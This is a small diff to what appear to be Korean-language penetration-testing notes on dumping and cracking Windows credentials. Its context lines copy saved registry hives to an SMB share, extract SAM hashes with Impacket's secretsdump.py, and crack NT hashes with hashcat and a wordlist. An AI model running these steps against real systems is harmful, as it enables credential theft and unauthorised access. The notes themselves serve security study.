@@ -254,7 +254,7 @@ C:\> move system.save \\<SMB Share IP>\CompData
 
 #### Impacket's secretsdump.py로 Dumping Hashes
 ```secretsdump.py -sam sam.save -security security.save -system system.save LOCAL```<br/>
-secretsdump 출력 : (uid:rid:lmhash:nthash)
+※ secretsdump SAM Hash 출력 : (uid:rid:lmhash:nthash)
 
 #### Hashcat으로 Cracking Hashes (NT Hash)
 ```hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt```
